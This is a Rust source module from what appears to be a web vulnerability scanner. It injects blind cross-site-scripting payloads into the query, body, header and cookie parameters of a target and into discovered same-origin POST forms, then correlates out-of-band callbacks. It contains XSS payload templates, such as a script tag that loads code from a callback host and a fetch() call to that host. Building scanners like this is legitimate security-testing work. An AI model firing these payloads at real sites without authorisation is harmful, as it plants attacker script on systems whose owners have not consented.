use crate::oob::{InjectionRecord, OobSession};
use crate::target_parser::Target;

/// Where a blind callback URL comes from for a given injection pass.
///
/// `Static` is the historical `-b/--blind <url>` behavior. `Oob` mints a fresh
/// per-payload interactsh URL (recorded for later correlation). `Both` sends a
/// payload for each — so `-b` and `--blind-oob` together fire both channels.
#[derive(Clone, Copy)]
pub enum CallbackSource<'a> {
    Static(&'a str),
    Oob(&'a OobSession),
    Both {
        url: &'a str,
        session: &'a OobSession,
    },
}

impl<'a> CallbackSource<'a> {
    fn static_url(&self) -> Option<&'a str> {
        match self {
            CallbackSource::Static(u) => Some(u),
            CallbackSource::Both { url, .. } => Some(url),
            CallbackSource::Oob(_) => None,
        }
    }

    fn session(&self) -> Option<&'a OobSession> {
        match self {
            CallbackSource::Oob(s) => Some(s),
            CallbackSource::Both { session, .. } => Some(session),
            CallbackSource::Static(_) => None,
        }
    }
}

/// Map an internal param-type tag to the wire `location` understood by
/// `generate_poc`. Cookies fold into `Header` (a cookie side-channel POC).
fn location_of(param_type: &str) -> &'static str {
    match param_type {
        "query" => "Query",
        "body" => "Body",
        "header" | "cookie" => "Header",
        _ => "",
    }
}

/// Whether `data` looks like an `application/x-www-form-urlencoded` body, so
/// the blind path may enumerate `&`/`=` fields from it and re-serialize them.
/// A JSON (`{`/`[`), GraphQL (`{`) or XML (`<`) body is not — splitting one on
/// `&`/`=` invents a garbage field name and re-serializes into a corrupt
/// request — so it is skipped. Requires an `=` so an opaque token body yields
/// no fields either.
fn looks_like_urlencoded_form(data: &str) -> bool {
    let trimmed = data.trim_start();
    !matches!(trimmed.as_bytes().first(), Some(b'{' | b'[' | b'<')) && trimmed.contains('=')
}

/// Placeholder the blind templates carry for the callback URL.
///
/// Custom templates are written with `{callback}` and keep it verbatim. They
/// used to be normalized to the built-in catalog's bare `{}`, and every `{}`
/// was then substituted — so a template with JavaScript in it
/// (`fetch('{callback}').catch(()=>{})`) had its empty function body replaced
/// by the callback URL too, the payload became a syntax error, and the blind
/// probe could never call home. The built-in `{}` is converted to this marker
/// instead, so a literal `{}` in a template is never touched.
const CALLBACK_MARKER: &str = "{callback}";

/// Last-resort template when the built-in catalog is somehow empty.
const FALLBACK_TEMPLATE: &str = "\"'><script src={callback}></script>";

/// Build the concrete payload(s) to send for one (param × template) slot and,
/// for any OOB source, mint+record a fresh callback URL keyed by its nonce so a
/// later interaction correlates back to this exact request.
///
/// `record_url` is the URL stored in the correlation registry (the target URL,
/// or a form's action URL). `location`/`method` describe the injection point.
fn build_send_payloads(
    source: &CallbackSource<'_>,
    template: &str,
    record_url: &str,
    param: &str,
    location: &str,
    method: &str,
) -> Vec<String> {
    let mut out = Vec::with_capacity(2);
    if let Some(url) = source.static_url() {
        out.push(template.replace(CALLBACK_MARKER, url));
    }
    if let Some(session) = source.session() {
        let (url, nonce) = session.mint_url();
        let payload = template.replace(CALLBACK_MARKER, &url);
        session.registry().record(
            nonce,
            InjectionRecord {
                target_url: record_url.to_string(),
                param: param.to_string(),
                location: location.to_string(),
                payload: payload.clone(),
                method: method.to_string(),
            },
        );
        out.push(payload);
    }
    out
}

/// Build the blind-XSS payload *templates* (callback placeholder still present,
/// as [`CALLBACK_MARKER`]).
///
/// When `custom_template_path` is provided, every non-empty, non-`#`-comment
/// line that contains `{callback}` is treated as a template. Lines without
/// `{callback}` are reported via stderr and dropped — the contract advertised by
/// `--custom-blind-xss-payload`. If no usable lines exist (or the file can't be
/// read), fall back to the built-in template.
fn build_blind_templates(custom_template_path: Option<&str>) -> Vec<String> {
    if let Some(path) = custom_template_path {
        match crate::utils::fs::read_bounded(
            std::path::Path::new(path),
            crate::utils::fs::MAX_FILE_READ_BYTES,
            "custom blind XSS template",
        ) {
            Ok(content) => {
                let mut templates: Vec<String> = Vec::new();
                let mut bad_lines = 0u32;
                for (lineno, line) in content.lines().enumerate() {
                    let trimmed = line.trim();
                    if trimmed.is_empty() || trimmed.starts_with('#') {
                        continue;
                    }
                    if trimmed.contains(CALLBACK_MARKER) {
                        templates.push(trimmed.to_string());
                    } else {
                        bad_lines += 1;
                        if bad_lines <= 3 {
                            eprintln!(
                                "Warning: --custom-blind-xss-payload line {} skipped (no {{callback}} placeholder)",
                                lineno + 1
                            );
                        }
                    }
                }
                if !templates.is_empty() {
                    return templates;
                }
                eprintln!(
                    "Warning: --custom-blind-xss-payload {} had no usable lines — falling back to built-in",
                    path
                );
            }
            Err(e) => {
                eprintln!(
                    "Warning: failed to read --custom-blind-xss-payload {}: {} — falling back to built-in",
                    path, e
                );
            }
        }
    }
    // Send every built-in shape, not just the first. The catalog carries
    // distinct breakout contexts (script-src, comment-then-script, and the
    // `<img onerror>` DOM-sink vector), and only the first was ever reaching
    // the wire — so the comment-breakout and innerHTML-compatible payloads were
    // defined but never sent. Blind scanning is opt-in and low-volume, so the
    // extra requests per param are a worthwhile trade for the added coverage.
    let templates: Vec<String> = crate::payload::XSS_BLIND_PAYLOADS
        .iter()
        .map(|t| t.replace("{}", CALLBACK_MARKER))
        .collect();
    if templates.is_empty() {
        return vec![FALLBACK_TEMPLATE.to_string()];
    }
    templates
}

/// Backward-compatible entry: inject a blind payload built from a single static
/// callback URL (`-b/--blind`). Thin shim over [`blind_scanning_with`].
pub async fn blind_scanning(
    target: &Target,
    callback_url: &str,
    custom_template_path: Option<&str>,
) {
    blind_scanning_with(
        target,
        CallbackSource::Static(callback_url),
        custom_template_path,
    )
    .await;
}

/// Inject blind payloads into every query/body/header/cookie param. For an OOB
/// (or `Both`) source, each (param × template) gets a fresh per-payload callback
/// URL recorded for later correlation.
pub async fn blind_scanning_with(
    target: &Target,
    source: CallbackSource<'_>,
    custom_template_path: Option<&str>,
) {
    let templates = build_blind_templates(custom_template_path);
    let method = target.parse_method().to_string();
    let record_url = target.url.as_str();

    // Collect all params with static str types to avoid per-param String allocation
    let mut all_params: Vec<(String, &str)> = Vec::new();

    // Query params
    for (k, _v) in target.url.query_pairs() {
        all_params.push((k.into_owned(), "query"));
    }

    // Body params. The blind body path only rewrites urlencoded forms
    // (`send_blind_request` re-serializes with `urlencoded_body`), so a JSON /
    // XML / GraphQL body is skipped whole rather than split on `&`/`=` — a
    // body like `{"next":"/a?x=1"}` is one `=`-bearing segment that would
    // otherwise be parsed into a garbage field name and re-serialized into a
    // corrupt request. Names are form-decoded, because the body injector
    // matches them against `form_urlencoded::parse` output: a raw
    // `user%5Bname%5D` or `first+name` never matched its decoded self, so the
    // real field was left untouched and a new, double-encoded field appended.
    if let Some(data) = &target.data
        && looks_like_urlencoded_form(data)
    {
        for pair in data.split('&') {
            if !pair.contains('=') {
                continue;
            }
            if let Some((k, _v)) = url::form_urlencoded::parse(pair.as_bytes()).next() {
                all_params.push((k.into_owned(), "body"));
            }
        }
    }

    // Headers
    for (k, _v) in &target.headers {
        all_params.push((k.clone(), "header"));
    }

    // Cookies
    for (k, _v) in &target.cookies {
        all_params.push((k.clone(), "cookie"));
    }

    // Send requests for each (param × template × callback channel). Custom
    // templates typically supply just one or two shapes, so the product stays
    // small.
    for (param_name, param_type) in &all_params {
        let location = location_of(param_type);
        for template in &templates {
            for payload in
                build_send_payloads(&source, template, record_url, param_name, location, &method)
            {
                send_blind_request(target, param_name, &payload, param_type).await;
            }
        }
    }
}

async fn send_blind_request(target: &Target, param_name: &str, payload: &str, param_type: &str) {
    use tokio::time::{Duration, sleep};
    use url::form_urlencoded;

    let client = target.build_client_or_default();
    let method = target.parse_method();

    // Headers, the User-Agent override and cookies go through the builders the
    // scan's own injectors use (`build_request`, `apply_header_overrides`, the
    // cookie branch of `url_inject::build_header_request`). This path used to
    // hand-roll them with reqwest's appending `.header()`: `--user-agent X`
    // lands in both `target.headers` and `target.user_agent`, so every blind
    // request carried two `User-Agent` headers, and the User-Agent injection —
    // the classic blind vector, since UAs end up in admin log viewers — went
    // out as `User-Agent: <payload>` *followed by* `User-Agent: X`. A
    // `-H "Cookie: …"` likewise travelled next to a second Cookie header
    // composed from `--cookies`.
    let request = match param_type {
        "query" => {
            let mut pairs: Vec<(String, String)> = target
                .url
                .query_pairs()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect();
            let mut found = false;
            for pair in &mut pairs {
                if pair.0 == param_name {
                    pair.1 = payload.to_string();
                    found = true;
                    break;
                }
            }
            if !found {
                pairs.push((param_name.to_string(), payload.to_string()));
            }
            let query = form_urlencoded::Serializer::new(String::new())
                .extend_pairs(&pairs)
                .finish();
            let mut url = target.url.clone();
            url.set_query(Some(&query));
            crate::utils::build_request(&client, target, method, url, target.data.clone())
        }
        "body" => {
            // Replace only the exact-name match's value and re-serialize. The
            // old `str::replace("{name}=", "{name}={payload}&")` never removed
            // the original value (`a=1&b=2` -> `a=PAY&1&b=2`) and matched
            // substring-colliding names (`id` also rewrote `userid`).
            let body = target.data.as_deref().map(|data| {
                crate::scanning::url_inject::urlencoded_body(Some(data), param_name, payload)
            });
            crate::utils::build_request(&client, target, method, target.url.clone(), body)
        }
        "header" => {
            let base = crate::utils::build_request(
                &client,
                target,
                method,
                target.url.clone(),
                target.data.clone(),
            );
            crate::utils::apply_header_overrides(
                base,
                &[(param_name.to_string(), payload.to_string())],
            )
        }
        "cookie" => {
            // Injected cookie first, the target's other cookies after it.
            let others =
                crate::utils::compose_cookie_header_excluding(&target.cookies, Some(param_name));
            let cookie_header = match others {
                Some(rest) => format!("{}={}; {}", param_name, payload, rest),
                None => format!("{}={}", param_name, payload),
            };
            crate::utils::build_request_with_cookie(
                &client,
                target,
                method,
                target.url.clone(),
                target.data.clone(),
                Some(cookie_header),
            )
        }
        _ => crate::utils::build_request(
            &client,
            target,
            method,
            target.url.clone(),
            target.data.clone(),
        ),
    };

    // Send the request. We don't inspect the response (blind payloads report
    // out-of-band), but surface transport errors at DEBUG so users can tell a
    // delivery failure apart from a target that simply never calls back.
    crate::record_outbound_request().await;
    if let Err(e) = request.send().await {
        crate::dbg_log!(
            "blind request failed param={} type={}: {}",
            param_name,
            param_type,
            e
        );
    }

    if target.delay > 0 {
        sleep(Duration::from_millis(target.delay)).await;
    }
}

/// Discover HTML `<form>` elements on the target page and submit the Blind XSS
/// payload to each same-origin POST form, one request per injectable text-like
/// field. Non-text inputs (hidden, file, submit, button, image, reset,
/// checkbox, radio) and `<select>` keep their original value so CSRF tokens
/// and similar state survive the injection.
///
/// GET forms are skipped because their fields overlap with the existing
/// query-param blind injection in [`blind_scanning`]. Cross-origin form
/// actions are skipped to avoid unintended outbound requests. Multipart
/// forms are also skipped in this first pass.
/// Backward-compatible entry: blind-scan forms with a single static callback
/// URL (`-b/--blind`). Thin shim over [`blind_scan_forms_with`].
pub async fn blind_scan_forms(
    target: &Target,
    callback_url: &str,
    custom_template_path: Option<&str>,
) {
    blind_scan_forms_with(
        target,
        CallbackSource::Static(callback_url),
        custom_template_path,
    )
    .await;
}

/// Discover same-origin POST forms and submit a blind payload per injectable
/// field. For an OOB (or `Both`) source each field gets a fresh per-payload
/// callback URL recorded for later correlation.
pub async fn blind_scan_forms_with(
    target: &Target,
    source: CallbackSource<'_>,
    custom_template_path: Option<&str>,
) {
    use tokio::time::{Duration, sleep};
    use url::form_urlencoded;

    let templates = build_blind_templates(custom_template_path);
    // For form-discovery blast we keep the first template — the form
    // probe is best-effort and using every template here multiplies
    // request count without changing detection probability much.
    let template = templates
        .first()
        .map(String::as_str)
        .unwrap_or(FALLBACK_TEMPLATE);

    let client = target.build_client_or_default();

    // Always GET the form-bearing page. Reusing target.method would POST to
    // the form handler instead of fetching the landing page that renders the
    // form, mirroring parameter_analysis::discovery::form::check_form_discovery.
    // Through the shared builder, which also drops a caller `Accept-Encoding`:
    // setting it by hand turns off reqwest's decompression, the page comes back
    // as compressed bytes, and no form is ever found.
    let fetch = crate::utils::build_request(
        &client,
        target,
        reqwest::Method::GET,
        target.url.clone(),
        None,
    );
    crate::record_outbound_request().await;
    let html = match fetch.send().await {
        Ok(resp) => match crate::utils::http::read_body(resp).await {
            Ok(text) => text,
            Err(_) => return,
        },
        Err(_) => return,
    };

    // Parse forms in a tight scope so `scraper::Html` (which is !Send) never
    // escapes across an await boundary.
    struct FormField {
        name: String,
        value: String,
        injectable: bool,
    }
    struct FormInfo {
        action: url::Url,
        fields: Vec<FormField>,
    }
    let forms: Vec<FormInfo> = {
        let document = crate::utils::html::parse_document_bounded(&html);
        let form_sel = crate::scanning::selectors::form();
        let input_sel = crate::scanning::selectors::input_textarea_select();

        let mut out = Vec::new();
        for form in document.select(form_sel) {
            let method = form.value().attr("method").unwrap_or("get");
            if !method.eq_ignore_ascii_case("post") {
                continue;
            }
            let enctype = form.value().attr("enctype").unwrap_or("");
            if enctype.eq_ignore_ascii_case("multipart/form-data") {
                continue;
            }

            let action_attr = form.value().attr("action").unwrap_or("");
            let Some(action_url) =
                crate::utils::http::resolve_probeable_form_action(&target.url, action_attr)
            else {
                continue;
            };

            let mut fields: Vec<FormField> = Vec::new();
            for input in form.select(input_sel) {
                let name = input.value().attr("name").unwrap_or("").to_string();
                if name.is_empty() {
                    continue;
                }
                let value = input.value().attr("value").unwrap_or("").to_string();
                let injectable = is_injectable_input(&input);
                fields.push(FormField {
                    name,
                    value,
                    injectable,
                });
            }
            if !fields.iter().any(|f| f.injectable) {
                continue;
            }

            out.push(FormInfo {
                action: action_url,
                fields,
            });
        }
        out
    };

    for FormInfo { action, fields } in forms {
        let action_str = action.as_str().to_string();
        for field_idx in 0..fields.len() {
            if !fields[field_idx].injectable {
                continue;
            }
            // One payload per callback channel (Static / Oob / Both). For OOB
            // this mints+records a fresh URL keyed to this form field.
            let field_name = &fields[field_idx].name;
            let payloads =
                build_send_payloads(&source, template, &action_str, field_name, "Body", "POST");
            for payload in &payloads {
                let body = fields
                    .iter()
                    .enumerate()
                    .map(|(i, f)| {
                        let value = if i == field_idx { payload } else { &f.value };
                        let enc_n =
                            form_urlencoded::byte_serialize(f.name.as_bytes()).collect::<String>();
                        let enc_v =
                            form_urlencoded::byte_serialize(value.as_bytes()).collect::<String>();
                        format!("{}={}", enc_n, enc_v)
                    })
                    .collect::<Vec<_>>()
                    .join("&");

                // The body-injector base drops a caller-supplied Content-Type so
                // the urlencoded one below is the only value on the wire.
                let request = crate::utils::build_body_request_base(
                    &client,
                    target,
                    reqwest::Method::POST,
                    action.clone(),
                    Some(body),
                );
                let request = crate::utils::apply_header_overrides(
                    request,
                    &[(
                        "Content-Type".to_string(),
                        "application/x-www-form-urlencoded".to_string(),
                    )],
                );

                crate::record_outbound_request().await;
                if let Err(e) = request.send().await {
                    crate::dbg_log!(
                        "blind form request failed action={} field_idx={}: {}",
                        action,
                        field_idx,
                        e
                    );
                }

                if target.delay > 0 {
                    sleep(Duration::from_millis(target.delay)).await;
                }
            }
        }
    }
}

/// Returns true when an `input`/`textarea`/`select` node accepts free-form
/// user-controlled text, so substituting the Blind XSS payload there makes
/// sense. Non-text-bearing inputs (hidden, file, submit, button, image,
/// reset, checkbox, radio) and `<select>` keep their original value so CSRF
/// tokens and option choices survive.
fn is_injectable_input(el: &scraper::element_ref::ElementRef<'_>) -> bool {
    let tag = el.value().name();
    if tag.eq_ignore_ascii_case("textarea") {
        return true;
    }
    if !tag.eq_ignore_ascii_case("input") {
        // `<select>` and anything else: not free-form text.
        return false;
    }
    // <input> defaults to type="text" when the attribute is missing or
    // unrecognized. Treat the well-known text-bearing types as injectable.
    let ty = el.value().attr("type").unwrap_or("text");
    matches!(
        ty.to_ascii_lowercase().as_str(),
        "text" | "search" | "url" | "email" | "tel" | "password" | "number"
    )
}

#[cfg(test)]
mod tests;
